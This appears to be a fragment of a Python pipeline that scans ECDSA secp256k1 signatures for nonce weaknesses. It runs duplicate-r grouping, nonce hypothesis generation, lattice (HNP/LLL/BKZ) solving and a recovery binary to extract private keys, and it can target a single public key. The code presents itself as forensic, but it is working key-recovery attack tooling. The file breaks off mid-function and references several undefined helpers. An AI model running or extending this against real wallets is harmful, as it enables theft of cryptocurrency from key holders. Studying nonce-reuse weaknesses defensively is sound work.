#!/usr/bin/env python3
"""Risk-aware automation pipeline:
1) Run signature forensics
2) Compute cluster-level nonce-risk (pubkey/script clusters)
3) Execute ecdsa_recover_strict only on suspicious clusters

Default behavior is defensive and reproducible.
"""

from __future__ import annotations

import argparse
import hashlib
import json
import math
import shlex
import subprocess
import sys
from collections import Counter, defaultdict
import importlib.util
import sys as _sys
import os
import multiprocessing as mp


def _flag_provided(argv: list[str], flag: str) -> bool:
    return any(a == flag or a.startswith(flag + "=") for a in argv)


def _detect_mem_gib(default_gib: float = 8.0) -> float:
    try:
        with open("/proc/meminfo", "r", encoding="utf-8") as f:
            for line in f:
                if line.startswith("MemTotal:"):
                    parts = line.split()
                    if len(parts) >= 2:
                        kib = int(parts[1])
                        return max(1.0, kib / (1024.0 * 1024.0))
    except Exception:
        pass
    return default_gib


def auto_tune_params(args: argparse.Namespace, argv: list[str], sig_rows: int) -> None:
    cpu = max(1, os.cpu_count() or 1)
    mem_gib = _detect_mem_gib()

    if mem_gib < 4:
        thr_auto = min(2, cpu)
    elif mem_gib < 8:
        thr_auto = min(4, max(1, cpu - 1))
    elif mem_gib < 16:
        thr_auto = min(8, max(1, cpu - 1))
    else:
        thr_auto = min(16, max(1, cpu - 1))

    if mem_gib < 8:
        cluster_min_auto = 40
        cluster_risk_auto = 25
        max_iter_auto = 1
        rk_auto = 0
    elif mem_gib < 16:
        cluster_min_auto = 30
        cluster_risk_auto = 20
        max_iter_auto = 2
        rk_auto = 0
    elif mem_gib < 32:
        cluster_min_auto = 20
        cluster_risk_auto = 15
        max_iter_auto = 2
        rk_auto = 1024
    else:
        cluster_min_auto = 12
        cluster_risk_auto = 10
        max_iter_auto = 3
        rk_auto = 4096

    if sig_rows > 1_000_000:
        cluster_min_auto += 5
    elif sig_rows > 500_000:
        cluster_min_auto += 2

    cluster_budget = int(max(30, min(300, mem_gib * 10)))
    cpu_budget = max(30, cpu * 12)
    max_clusters_auto = min(cluster_budget, cpu_budget)

    if not _flag_provided(argv, "--threads"):
        args.threads = thr_auto
    if not _flag_provided(argv, "--cluster-min-sigs"):
        args.cluster_min_sigs = cluster_min_auto
    if not _flag_provided(argv, "--cluster-risk-threshold"):
        args.cluster_risk_threshold = cluster_risk_auto
    if not _flag_provided(argv, "--max-clusters"):
        args.max_clusters = max_clusters_auto
    if not _flag_provided(argv, "--max-iter"):
        args.max_iter = max_iter_auto
    if not _flag_provided(argv, "--random-k-budget"):
        args.random_k_budget = rk_auto

    print(
        "[auto-tune]",
        f"cpu={cpu}",
        f"mem_gib={mem_gib:.1f}",
        f"sig_rows={sig_rows}",
        f"threads={args.threads}",
        f"cluster_min_sigs={args.cluster_min_sigs}",
        f"cluster_risk_threshold={args.cluster_risk_threshold}",
        f"max_clusters={args.max_clusters}",
        f"max_iter={args.max_iter}",
        f"random_k_budget={args.random_k_budget}",
    )


def _hnp_worker(leaks, q, bits_known, solver_path, qout):
    try:
        spec = importlib.util.spec_from_file_location("hnp_lll_bkz_solver_worker", solver_path)
        hnp_solver = importlib.util.module_from_spec(spec)
        spec.loader.exec_module(hnp_solver)
        result = hnp_solver.recover_private_key(leaks, q, bits_known)
        if isinstance(result, tuple):
            candidates = result[0] if len(result) > 0 else []
        else:
            candidates = result
        if not isinstance(candidates, (list, tuple, set)):
            qout.put(("error", "unexpected_candidates_type"))
            return
        clean = []
        for c in candidates:
            try:
                d = int(c)
            except Exception:
                continue
            # Treat the HNP solver as untrusted until its synthetic regression is
            # consistently green. Only return candidates that satisfy the
            # explicit nonce-bit leakage model on almost every row.
            try:
                verdict = hnp_solver.validate_candidate(d, leaks, q, bits_known)
                if verdict.get("confidence") == "high":
                    clean.append(d)
            except Exception:
                continue
        qout.put(("ok", clean))
    except Exception as e:
        qout.put(("error", str(e)))


def try_hnp_lll_bkz_solver(
    sig_path,
    bits_known=6,
    q=None,
    out_path="hnp_lll_bkz_candidates.txt",
    report_path="hnp_lll_bkz_report.json",
    timeout_sec=120,
    min_leaks=8,
):
    """
    Try to run the HNP/LLL/BKZ solver on a set of signatures with partial nonce leaks.
    Expects sig_path to be a JSONL file with fields r, s, z, and known_nonce_bits (if available).
    """
    solver_path = os.path.join(os.path.dirname(__file__), "hnp_lll_bkz_solver.py")
    report = {
        "input": str(sig_path),
        "output": str(out_path),
        "bits_known": int(bits_known),
        "min_leaks": int(min_leaks),
        "timeout_sec": int(timeout_sec),
        "ran": False,
        "candidates": 0,
    }
    def write_hnp_report(reason: str, **extra: Any) -> None:
        report.update({"reason": reason, **extra})
        try:
            Path(report_path).parent.mkdir(parents=True, exist_ok=True)
            Path(report_path).write_text(json.dumps(report, indent=2), encoding="utf-8")
        except Exception:
            pass

    if not os.path.exists(solver_path):
        print("[HNP/LLL/BKZ] Solver script not found.")
        write_hnp_report("solver_missing")
        return None
    leaks = []
    total_rows = 0
    rows_with_known_nonce_bits = 0
    nonce_bit_keys = ("known_nonce_bits", "nonce_lsb", "k_lsb", "known_k_lsb")
    with open(sig_path, "r", encoding="utf-8") as f:
        for line in f:
            total_rows += 1
            try:
                obj = json.loads(line.strip())
                known_nonce_raw = None
                for kf in nonce_bit_keys:
                    if kf in obj:
                        known_nonce_raw = obj.get(kf)
                        break
                if known_nonce_raw is None:
                    continue
                r = parse_int(obj.get("r"))
                s = parse_int(obj.get("s"))
                z_raw = obj.get("z")
                if z_raw is None:
                    z_raw = obj.get("m")
                m = parse_int(z_raw)
                known_nonce = parse_int(known_nonce_raw)
                leaks.append((r, s, m, known_nonce))
                rows_with_known_nonce_bits += 1
            except Exception:
                continue
    if not leaks:
        print(
            "[HNP/LLL/BKZ] Skipping: no valid rows with explicit known_nonce_bits "
            f"(rows={total_rows}, with_known_nonce_bits={rows_with_known_nonce_bits})."
        )
        write_hnp_report(
            "no_explicit_nonce_leaks",
            total_rows=total_rows,
            rows_with_known_nonce_bits=rows_with_known_nonce_bits,
            valid_leaks=0,
        )
        return None
    if len(leaks) < int(min_leaks):
        print(
            "[HNP/LLL/BKZ] Skipping: insufficient leakage samples "
            f"(valid_leaks={len(leaks)} < min_leaks={int(min_leaks)})."
        )
        write_hnp_report(
            "insufficient_nonce_leaks",
            total_rows=total_rows,
            rows_with_known_nonce_bits=rows_with_known_nonce_bits,
            valid_leaks=len(leaks),
        )
        return None
    if q is None:
        q = int("FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141", 16)

    qout: mp.Queue = mp.Queue()
    proc = mp.get_context("spawn").Process(
        target=_hnp_worker, args=(leaks, int(q), int(bits_known), solver_path, qout)
    )
    proc.start()
    report.update(
        {
            "ran": True,
            "total_rows": total_rows,
            "rows_with_known_nonce_bits": rows_with_known_nonce_bits,
            "valid_leaks": len(leaks),
        }
    )
    proc.join(timeout=float(timeout_sec))
    if proc.is_alive():
        proc.terminate()
        proc.join(5)
        print(f"[HNP/LLL/BKZ] Solver timeout after {timeout_sec}s; continuing pipeline.")
        write_hnp_report("timeout")
        return None
    if proc.exitcode not in (0, None):
        print(f"[HNP/LLL/BKZ] Solver process failed (exit={proc.exitcode}); continuing pipeline.")
        write_hnp_report("process_failed", exitcode=proc.exitcode)
        return None
    if qout.empty():
        print("[HNP/LLL/BKZ] Solver returned no result; continuing pipeline.")
        write_hnp_report("empty_result")
        return None
    status, payload = qout.get()
    if status != "ok":
        print(f"[HNP/LLL/BKZ] Solver execution failed: {payload}")
        write_hnp_report("solver_error", error=str(payload))
        return None
    candidates = payload
    with open(out_path, "w", encoding="utf-8") as fout:
        for c in candidates:
            fout.write(f"{c}\n")
    print(f"[HNP/LLL/BKZ] Candidates written to {out_path}")
    write_hnp_report("ok", candidates=len(candidates))
    return candidates


def run_nonce_hypothesis_generator(args: argparse.Namespace, sig_path: str) -> dict[str, Any]:
    if not args.enable_nonce_hypotheses:
        return {"enabled": False}
    script = Path(__file__).with_name("candidate_hypotheses.py")
    if not script.exists():
        return {"enabled": True, "error": "candidate_hypotheses.py missing"}
    cmd = [
        resolve_python_executable(),
        str(script),
        "--sigs", sig_path,
        "--out", args.nonce_hypothesis_out,
        "--report", args.nonce_hypothesis_report,
        "--models", args.nonce_hypothesis_models,
        "--time-window-sec", str(args.nonce_time_window_sec),
        "--time-step-sec", str(args.nonce_time_step_sec),
        "--counter-max", str(args.nonce_counter_max),
        "--small-k-start", str(args.nonce_small_k_start),
        "--small-k-end", str(args.nonce_small_k_end),
        "--max-candidates", str(args.nonce_max_candidates),
    ]
    if args.target_pubkey:
        cmd += ["--target-pubkey", args.target_pubkey]
    rc = run_cmd(cmd)
    report: dict[str, Any] = {"enabled": True, "rc": rc, "output": args.nonce_hypothesis_out}
    try:
        p = Path(args.nonce_hypothesis_report)
        if p.exists():
            report.update(json.loads(p.read_text(encoding="utf-8")))
    except Exception as e:
        report["report_error"] = str(e)
    return report


def merge_preload_k_files(paths: list[Path], out_path: Path) -> Path | None:
    existing = [p for p in paths if p and p.exists() and count_nonempty_lines(p) > 0]
    if not existing:
        return None
    if len(existing) == 1:
        return existing[0]
    out_path.parent.mkdir(parents=True, exist_ok=True)
    seen = set()
    with out_path.open("w", encoding="utf-8") as out:
        for p in existing:
            with p.open("r", encoding="utf-8", errors="ignore") as src:
                for line in src:
                    raw = line.strip()
                    if not raw or raw in seen:
                        continue
                    seen.add(raw)
                    out.write(raw + "\n")
    return out_path
from pathlib import Path
from typing import Any


def count_known_nonce_rows(sig_path: Path) -> int:
    keys = ("known_nonce_bits", "nonce_lsb", "k_lsb", "known_k_lsb")
    count = 0
    with sig_path.open("r", encoding="utf-8") as f:
        for line in f:
            raw = line.strip()
            if not raw:
                continue
            try:
                obj = json.loads(raw)
            except Exception:
                continue
            if isinstance(obj, dict) and any(k in obj for k in keys):
                count += 1
    return count


def build_explicit_hnp_leak_subset(
    *,
    sig_path: Path,
    out_path: Path,
    report_path: Path,
    bits_known: int,
    leakage_model: str = "LSB",
) -> dict[str, Any]:
    """Normalize explicit nonce-leak rows for the HNP solver.

    This does not infer or invent nonce leakage. It only accepts explicit fields
    already present in JSONL rows and writes a standardized local leak file.
    """
    lsb_keys = ("known_nonce_bits", "nonce_lsb", "k_lsb", "known_k_lsb")
    msb_keys = ("nonce_msb", "k_msb", "known_k_msb")
    model = leakage_model.upper()
    accepted_keys = lsb_keys if model == "LSB" else msb_keys
    unsupported_keys = msb_keys if model == "LSB" else lsb_keys
    max_known = 1 << int(bits_known)

    total_rows = 0
    explicit_rows = 0
    valid_rows = 0
    skipped_bad_json = 0
    skipped_missing_core = 0
    skipped_out_of_range = 0
    unsupported_model_rows = 0
    key_counts: Counter[str] = Counter()
    signer_counts: Counter[str] = Counter()
    seen = set()

    out_path.parent.mkdir(parents=True, exist_ok=True)
    with sig_path.open("r", encoding="utf-8", errors="replace") as src, out_path.open("w", encoding="utf-8") as out:
        for line in src:
            raw = line.strip()
            if not raw:
                continue
            total_rows += 1
            try:
                obj = json.loads(raw)
            except Exception:
                skipped_bad_json += 1
                continue
            if not isinstance(obj, dict):
                skipped_bad_json += 1
                continue

            unsupported_model_rows += int(any(k in obj for k in unsupported_keys))
            leak_key = None
            leak_value_raw = None
            for k in accepted_keys:
                if k in obj:
                    leak_key = k
                    leak_value_raw = obj.get(k)
                    break
            if leak_key is None:
                continue
            explicit_rows += 1
            key_counts[leak_key] += 1

            try:
                r = parse_int(obj.get("r"))
                s = parse_int(obj.get("s"))
                z_raw = obj.get("z")
                if z_raw is None:
                    z_raw = obj.get("m")
                m = parse_int(z_raw)
                known = parse_int(leak_value_raw)
            except Exception:
                skipped_missing_core += 1
                continue
            if not (1 <= r < SECP256K1_N and 1 <= s < SECP256K1_N and 0 <= known < max_known):
                skipped_out_of_range += 1
                continue

            dedup_key = (r, s, m, known)
            if dedup_key in seen:
                continue
            seen.add(dedup_key)
            pub = normalize_pubkey_hex(str(obj.get("pubkey_hex") or obj.get("pub") or ""))
            if pub:
                signer_counts[pub] += 1
            out.write(
                json.dumps(
                    {
                        "r": format(r, "064x"),
                        "s": format(s, "064x"),
                        "m": format(m, "064x"),
                        "known_nonce_bits": known,
                        "source_leak_field": leak_key,
                        "pubkey_hex": pub,
                    }
                )
                + "\n"
            )
            valid_rows += 1

    payload = {
        "source_sigs": str(sig_path),
        "output": str(out_path),
        "bits_known": int(bits_known),
        "leakage_model": model,
        "total_rows": total_rows,
        "explicit_leak_rows": explicit_rows,
        "valid_leak_rows": valid_rows,
        "unique_valid_leak_rows": valid_rows,
        "skipped_bad_json_rows": skipped_bad_json,
        "skipped_missing_core_rows": skipped_missing_core,
        "skipped_out_of_range_rows": skipped_out_of_range,
        "unsupported_model_rows": unsupported_model_rows,
        "field_counts": dict(key_counts),
        "unique_signers_with_leaks": len(signer_counts),
        "top_signer_leak_counts": [
            {"pubkey_prefix": pub[:20], "leak_rows": count}
            for pub, count in signer_counts.most_common(20)
        ],
        "secret_material": "LOCAL_ARTIFACT_ONLY",
    }
    report_path.parent.mkdir(parents=True, exist_ok=True)
    report_path.write_text(json.dumps(payload, indent=2), encoding="utf-8")
    return payload


def generate_explicit_leak_k_candidates(
    *,
    leak_path: Path,
    out_path: Path,
    report_path: Path,
    bits_known: int,
    leakage_model: str,
    max_unknown_bits: int,
    max_total_candidates: int,
) -> dict[str, Any]:
    """Generate exact bounded nonce candidates from explicit leak rows.

    This only runs when the remaining unknown nonce space is small enough to be
    exhaustively enumerated. Candidate k values are written to a local preload-k
    artifact; reports contain counts only.
    """
    model = leakage_model.upper()
    q = SECP256K1_N
    bits = int(bits_known)
    max_unknown = max(0, int(max_unknown_bits))
    max_total = max(0, int(max_total_candidates))
    unknown_bits = max(0, q.bit_length() - bits)

    report: dict[str, Any] = {
        "input": str(leak_path),
        "output": str(out_path),
        "bits_known": bits,
        "leakage_model": model,
        "unknown_bits": unknown_bits,
        "max_unknown_bits": max_unknown,
        "max_total_candidates": max_total,
        "enabled": unknown_bits <= max_unknown and max_total > 0,
        "rows_seen": 0,
        "rows_emitted": 0,
        "rows_skipped_too_many_candidates": 0,
        "rows_skipped_bad": 0,
        "total_candidates": 0,
        "secret_material": "LOCAL_ARTIFACT_ONLY",
    }
    if not report["enabled"] or not leak_path.exists():
        reason = "unknown_space_too_large" if unknown_bits > max_unknown else "missing_or_disabled"
        report["reason"] = reason
        report_path.parent.mkdir(parents=True, exist_ok=True)
        report_path.write_text(json.dumps(report, indent=2), encoding="utf-8")
        return report

    out_path.parent.mkdir(parents=True, exist_ok=True)
    with leak_path.open("r", encoding="utf-8", errors="replace") as src, out_path.open("w", encoding="utf-8") as out:
        for line in src:
            raw = line.strip()
            if not raw:
                continue
            report["rows_seen"] = int(report["rows_seen"]) + 1
            try:
                obj = json.loads(raw)
                r_hex = format(parse_int(obj.get("r")), "064x")
                known = parse_int(obj.get("known_nonce_bits"))
            except Exception:
                report["rows_skipped_bad"] = int(report["rows_skipped_bad"]) + 1
                continue

            candidates: list[str] = []
            if model == "LSB":
                step = 1 << bits
                if known >= step:
                    report["rows_skipped_bad"] = int(report["rows_skipped_bad"]) + 1
                    continue
                count = ((q - 1 - known) // step) + 1
                if count <= 0:
                    report["rows_skipped_bad"] = int(report["rows_skipped_bad"]) + 1
                    continue
                if count > (1 << max_unknown):
                    report["rows_skipped_too_many_candidates"] = int(report["rows_skipped_too_many_candidates"]) + 1
                    continue
                if int(report["total_candidates"]) + count > max_total:
                    report["rows_skipped_too_many_candidates"] = int(report["rows_skipped_too_many_candidates"]) + 1
                    continue
                for x in range(int(count)):
                    k = known + step * x
                    if 1 <= k < q:
                        candidates.append(format(k, "064x"))
            else:
                report["rows_skipped_bad"] = int(report["rows_skipped_bad"]) + 1
                continue

            if not candidates:
                continue
            out.write(json.dumps({"r": r_hex, "k_candidates": candidates, "source": "explicit-leak-bounded"}) + "\n")
            report["rows_emitted"] = int(report["rows_emitted"]) + 1
            report["total_candidates"] = int(report["total_candidates"]) + len(candidates)

    report["reason"] = "ok"
    report_path.parent.mkdir(parents=True, exist_ok=True)
    report_path.write_text(json.dumps(report, indent=2), encoding="utf-8")
    return report


def recovery_viability_label(
    *,
    stage0_subset_info: dict[str, Any] | None,
    known_nonce_rows: int,
    min_hnp_leaks: int,
    dup_r: int,
    cross_pub_dup_r: int,
    strong_signal: bool,
    external_candidate_requested: bool,
) -> str:
    """Classify whether the current evidence is recovery-grade or only anomalous."""
    if external_candidate_requested:
        return "external_candidate_validation"
    if stage0_subset_info and int(stage0_subset_info.get("same_r_diff_s_groups", 0) or 0) > 0:
        return "direct_nonce_reuse"
    if known_nonce_rows >= int(min_hnp_leaks):
        return "partial_nonce_leak"
    if cross_pub_dup_r > 0:
        return "cross_pub_duplicate_r_investigate"
    if dup_r > 0:
        return "replay_like_duplicate_r"
    if strong_signal:
        return "weak_anomaly_only"
    return "none"


def resolve_python_executable() -> str:
    """Prefer active virtualenv interpreter when available for subprocess parity."""
    venv = os.environ.get("VIRTUAL_ENV", "").strip()
    if venv:
        cand = Path(venv) / "bin" / "python3"
        if cand.exists() and os.access(cand, os.X_OK):
            return str(cand)
    return sys.executable


def run_cmd(cmd: list[str]) -> int:
    print("$", " ".join(shlex.quote(x) for x in cmd))
    p = subprocess.run(cmd)
    return p.returncode


def write_decision(path: str, payload: dict[str, Any]) -> None:
    with open(path, "w", encoding="utf-8") as f:
        json.dump(payload, f, indent=2)


def run_recover_stage(
    recover_bin: str,
    recover_input: str,
    threads: int,
    max_iter: int,
    stage_name: str,
    recover_json_out: str,
    recover_txt_out: str,
    recover_k_out: str,
    recover_deltas_out: str,
    recover_collisions_out: str,
    recover_clusters_out: str,
    extra_args: list[str],
) -> int:
    rec_cmd = [
        recover_bin,
        "--sigs", recover_input,
        "--threads", str(threads),
        "--out-json", recover_json_out,
        "--out-txt", recover_txt_out,
        "--out-k", recover_k_out,
        "--out-deltas", recover_deltas_out,
        "--report-collisions", recover_collisions_out,
        "--export-clusters", recover_clusters_out,
        "--max-iter", str(max_iter),
    ] + extra_args
    print(f"[recover-stage] {stage_name}")
    return run_cmd(rec_cmd)


def build_strong_signal_subset_from_cluster_report(
    sig_path: Path,
    cluster_report_path: Path,
    out_path: Path,
) -> int:
    if not sig_path.exists() or not cluster_report_path.exists():
        return 0
    try:
        crep = json.loads(cluster_report_path.read_text(encoding="utf-8"))
    except Exception:
        return 0
    tops = crep.get("top_clusters", []) or []
    strong_clusters = {
        x.get("cluster")
        for x in tops
        if (
            int(x.get("dup_r_values", 0) or 0) > 0
            or int(x.get("dup_r_events", 0) or 0) > 0
            or int(x.get("fdr_bits_r", 0) or 0) > 0
            or float(x.get("tiny_r_ratio", 0.0) or 0.0) >= 0.01
            or int(x.get("cluster_risk_score_v2", x.get("cluster_risk_score", 0)) or 0) >= int(
                ((crep.get("policy", {}) or {}).get("cluster_risk_threshold", 0) or 0)
            )
        )
    }
    if not strong_clusters:
        return 0

    selected = 0
    out_path.parent.mkdir(parents=True, exist_ok=True)
    with sig_path.open("r", encoding="utf-8") as fin, out_path.open("w", encoding="utf-8") as fout:
        for line in fin:
            raw = line.strip()
            if not raw:
                continue
            try:
                obj = json.loads(raw)
            except Exception:
                continue
            key = cluster_key(obj)
            if key in strong_clusters:
                fout.write(raw + "\n")
                selected += 1
    return selected


def parse_int(x: Any) -> int:
    if isinstance(x, int):
        return x
    if isinstance(x, str):
        s = x.strip()
        if not s:
            raise ValueError("empty integer string")
        if s.startswith(("0x", "0X")):
            return int(s, 16)
        # Signature fields are typically hex-encoded fixed-width values (r/s/z).
        # Treat long hex-like strings as hex even when they happen to contain only digits.
        if all(c in "0123456789abcdefABCDEF" for c in s) and len(s) > 20:
            return int(s, 16)
        return int(s, 10)
    raise TypeError(f"Unsupported integer type: {type(x)}")


def count_nonempty_lines(path: Path) -> int:
    if not path.exists():
        return 0
    with path.open("r", encoding="utf-8") as f:
        return sum(1 for line in f if line.strip())


def sha256_file(path: Path) -> str | None:
    if not path.exists():
        return None
    h = hashlib.sha256()
    with path.open("rb") as f:
        for chunk in iter(lambda: f.read(1024 * 1024), b""):
            h.update(chunk)
    return h.hexdigest()


def build_external_candidate_args(args: argparse.Namespace) -> tuple[list[str], dict[str, Any]]:
    extra: list[str] = []
    report: dict[str, Any] = {
        "enabled": False,
        "preload_k_candidates": None,
        "preload_priv_candidates": None,
    }

    if args.preload_k_candidates:
        p = Path(args.preload_k_candidates)
        if not p.exists():
            print(f"[warn] skipping missing --preload-k-candidates file: {p}")
            report["preload_k_candidates"] = {
                "path": str(p),
                "missing": True,
                "rows": 0,
                "sha256": None,
            }
        else:
            extra += ["--preload-k", str(p)]
            report["enabled"] = True
            report["preload_k_candidates"] = {
                "path": str(p),
                "rows": count_nonempty_lines(p),
                "sha256": sha256_file(p),
            }

    if args.preload_priv_candidates:
        p = Path(args.preload_priv_candidates)
        if not p.exists():
            print(f"[warn] skipping missing --preload-priv-candidates file: {p}")
            report["preload_priv_candidates"] = {
                "path": str(p),
                "missing": True,
                "rows": 0,
                "sha256": None,
            }
        else:
            extra += ["--preload-priv", str(p)]
            report["enabled"] = True
            # Do not inspect or echo candidate private material. Only artifact metadata.
            report["preload_priv_candidates"] = {
                "path": str(p),
                "rows": count_nonempty_lines(p),
                "sha256": sha256_file(p),
            }

    if getattr(args, "preload_recovered_json", ""):
        p = Path(args.preload_recovered_json)
        if not p.exists():
            print(f"[warn] skipping missing --preload-recovered-json file: {p}")
            report["preload_recovered_json"] = {
                "path": str(p),
                "missing": True,
                "rows": 0,
                "sha256": None,
            }
        else:
            extra += ["--preload-recovered", str(p)]
            report["enabled"] = True
            report["preload_recovered_json"] = {
                "path": str(p),
                "rows": count_nonempty_lines(p),
                "sha256": sha256_file(p),
            }

    return extra, report


def structured_relation_args(args: argparse.Namespace) -> list[str]:
    """Bounded nonce-relation scan knobs passed through to ecdsa_recover_strict."""
    return [
        "--bucket-mode", "pub",
        "--dg-max-delta", str(max(0, int(args.delta_max))),
        "--dg-per-pair-cap", str(max(0, int(args.delta_per_pair_cap))),
        "--lcg-a-max", str(max(0, int(args.lcg_a_max))),
        "--lcg-b-max", str(max(0, int(args.lcg_b_max))),
        "--lcg-per-pair-cap", str(max(0, int(args.lcg_per_pair_cap))),
    ]


def write_candidate_validation_report(
    path: Path,
    candidate_report: dict[str, Any],
    pre_validation: dict[str, Any],
    post_validation: dict[str, Any],
) -> None:
    summary = recovery_material_summary(candidate_report, pre_validation, post_validation)
    payload = {
        "external_candidates": candidate_report,
        "pre_recover_validation": pre_validation,
        "post_recover_validation": post_validation,
        "preloaded_recovered_validation": summary["preloaded_recovered_validation"],
        "key_recovered": summary["key_recovered"],
        "new_key_recovered": summary["new_key_recovered"],
        "valid_recovered_material_present": summary["valid_recovered_material_present"],
        "recovery_outcome": summary["recovery_outcome"],
        "no_new_key_reason": summary["no_new_key_reason"],
        "new_local_recovered_rows": summary["new_local_recovered_rows"],
        "key_material_present": summary["key_material_present"],
        "pre_existing_valid_recovered_rows": summary["pre_existing_valid_recovered_rows"],
        "preloaded_valid_recovered_rows": summary["preloaded_valid_recovered_rows"],
        "cycle_valid_recovered_rows": summary["cycle_valid_recovered_rows"],
        "total_valid_recovered_rows": summary["total_valid_recovered_rows"],
        "priv_material": "LOCAL_ARTIFACT_ONLY",
    }
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(json.dumps(payload, indent=2), encoding="utf-8")


def recovery_material_summary(
    candidate_report: dict[str, Any],
    pre_validation: dict[str, Any],
    post_validation: dict[str, Any],
) -> dict[str, Any]:
    """Summarize newly emitted and preloaded recovered-key artifacts.

    Cycle-local output may be empty when all known keys were supplied via
    --preload-recovered-json. Treat those preloaded rows as available local
    material, but keep the "new_local_recovered_rows" metric strict.
    """
    pre_valid_rows = int(pre_validation.get("valid_rows", 0) or 0)
    post_valid_rows = int(post_validation.get("valid_rows", 0) or 0)
    new_valid_rows = max(0, post_valid_rows - pre_valid_rows)

    preload_meta = candidate_report.get("preload_recovered_json") or {}
    preload_validation: dict[str, Any] = {
        "exists": False,
        "rows": 0,
        "valid_rows": 0,
        "invalid_rows": 0,
    }
    preload_path = preload_meta.get("path")
    if preload_path and not preload_meta.get("missing"):
        preload_validation = post_validate_recovered(Path(preload_path))

    preloaded_valid_rows = int(preload_validation.get("valid_rows", 0) or 0)
    total_available = post_valid_rows + preloaded_valid_rows
    if new_valid_rows > 0:
        recovery_outcome = "new_key_recovered"
        no_new_key_reason = None
    elif total_available > 0:
        recovery_outcome = "known_material_available"
        no_new_key_reason = "only_preexisting_or_preloaded_valid_material"
    else:
        recovery_outcome = "no_valid_recovered_material"
        no_new_key_reason = "no_candidate_validated"
    return {
        "key_recovered": new_valid_rows > 0,
        "new_key_recovered": new_valid_rows > 0,
        "valid_recovered_material_present": total_available > 0,
        "recovery_outcome": recovery_outcome,
        "no_new_key_reason": no_new_key_reason,
        "new_local_recovered_rows": new_valid_rows,
        "key_material_present": total_available > 0,
        "pre_existing_valid_recovered_rows": pre_valid_rows,
        "preloaded_valid_recovered_rows": preloaded_valid_rows,
        "cycle_valid_recovered_rows": post_valid_rows,
        "total_valid_recovered_rows": total_available,
        "preloaded_recovered_validation": preload_validation,
    }


def normalize_pubkey_hex(value: str) -> str:
    s = (value or "").strip().lower()
    if s.startswith("0x"):
        s = s[2:]
    return s


def build_target_pubkey_subset(sig_path: Path, target_pubkey: str, out_path: Path) -> dict[str, Any]:
    target = normalize_pubkey_hex(target_pubkey)
    if not target:
        return {"enabled": False}
    if len(target) not in {66, 130} or any(c not in "0123456789abcdef" for c in target):
        raise ValueError("--target-pubkey must be a compressed or uncompressed SEC pubkey hex string")

    total_rows = 0
    matched_rows = 0
    skipped_bad_json = 0
    missing_pubkey = 0
    unique_tx_inputs: set[tuple[str, str]] = set()

    out_path.parent.mkdir(parents=True, exist_ok=True)
    with sig_path.open("r", encoding="utf-8") as src, out_path.open("w", encoding="utf-8") as out:
        for line in src:
            raw = line.strip()
            if not raw:
                continue
            total_rows += 1
            try:
                obj = json.loads(raw)
            except Exception:
                skipped_bad_json += 1
                continue
            if not isinstance(obj, dict):
                skipped_bad_json += 1
                continue
            pub = normalize_pubkey_hex(str(obj.get("pubkey_hex") or obj.get("pub") or ""))
            if not pub:
                missing_pubkey += 1
                continue
            if pub != target:
                continue
            out.write(raw + "\n")
            matched_rows += 1
            txid = str(obj.get("txid") or "")
            vin = str(obj.get("vin") if obj.get("vin") is not None else obj.get("input_index") or "")
            if txid:
                unique_tx_inputs.add((txid, vin))

    return {
        "enabled": True,
        "target_pubkey": target,
        "source": str(sig_path),
        "output": str(out_path),
        "total_rows": total_rows,
        "matched_rows": matched_rows,
        "unique_tx_inputs": len(unique_tx_inputs),
        "missing_pubkey_rows": missing_pubkey,
        "skipped_bad_json_rows": skipped_bad_json,
    }


def build_duplicate_r_focus_subset(
    sig_path: Path,
    out_path: Path,
    recoverable_out_path: Path | None = None,
    replay_out_path: Path | None = None,
    report_path: Path | None = None,
) -> dict[str, Any]:
    rows_by_r: dict[int, list[tuple[str, dict[str, Any]]]] = defaultdict(list)
    with sig_path.open("r", encoding="utf-8") as f:
        for line in f:
            raw = line.strip()
            if not raw:
                continue
            try:
                obj = json.loads(raw)
                if not isinstance(obj, dict):
                    continue
                r = parse_int(obj.get("r"))
            except Exception:
                continue
            rows_by_r[r].append((raw, obj))

    dup_groups = {r: rows for r, rows in rows_by_r.items() if len(rows) > 1}
    selected = 0
    nontrivial_groups = 0
    exact_replay_groups = 0
    same_r_same_s_diff_z_groups = 0
    same_r_diff_s_groups = 0
    nontrivial_selected = 0
    recoverable_selected = 0
    replay_selected = 0
    cross_pub_groups = 0
    report_groups: list[dict[str, Any]] = []

    out_path.parent.mkdir(parents=True, exist_ok=True)
    recoverable_out = None
    replay_out = None
    try:
        if recoverable_out_path is not None:
            recoverable_out_path.parent.mkdir(parents=True, exist_ok=True)
            recoverable_out = recoverable_out_path.open("w", encoding="utf-8")
        if replay_out_path is not None:
            replay_out_path.parent.mkdir(parents=True, exist_ok=True)
            replay_out = replay_out_path.open("w", encoding="utf-8")
        with out_path.open("w", encoding="utf-8") as out:
            for r_value, rows in dup_groups.items():
                s_set = set()
                z_set = set()
                uniq_sz = set()
                pub_set = set()
                tx_inputs = set()
                for _, obj in rows:
                    try:
                        sv = parse_int(obj.get("s"))
                        zv = parse_int(obj.get("z"))
                        s_set.add(sv)
                        z_set.add(zv)
                        uniq_sz.add((sv, zv))
                    except Exception:
                        pass
                    pub = normalize_pubkey_hex(str(obj.get("pubkey_hex") or obj.get("pub") or ""))
                    if pub:
                        pub_set.add(pub)
                    txid = str(obj.get("txid") or "")
                    vin = str(obj.get("vin") if obj.get("vin") is not None else obj.get("input_index") or "")
                    if txid:
                        tx_inputs.add((txid, vin))

                is_nontrivial = False
                group_kind = "unknown"
                if len(uniq_sz) == 1:
                    exact_replay_groups += 1
                    group_kind = "exact_replay"
                elif len(s_set) == 1 and len(z_set) > 1:
                    same_r_same_s_diff_z_groups += 1
                    group_kind = "same_r_same_s_diff_z"
                elif len(s_set) > 1:
                    same_r_diff_s_groups += 1
                    nontrivial_groups += 1
                    is_nontrivial = True
                    group_kind = "same_r_diff_s"
                else:
                    nontrivial_groups += 1
                    is_nontrivial = True
                    group_kind = "nontrivial_unknown"

                if len(pub_set) > 1:
                    cross_pub_groups += 1

                # Nontrivial duplicate-r is the direct algebraic recovery path.
                # Cross-pub duplicate-r remains high-value evidence even when
                # same-r/s rows are replay-like, so keep it in recoverable focus.
                is_recoverable_focus = is_nontrivial or len(pub_set) > 1

                report_groups.append(
                    {
                        "r": format(r_value, "064x"),
                        "kind": group_kind,
                        "rows": len(rows),
                        "unique_s": len(s_set),
                        "unique_z": len(z_set),
                        "unique_pubkeys": len(pub_set),
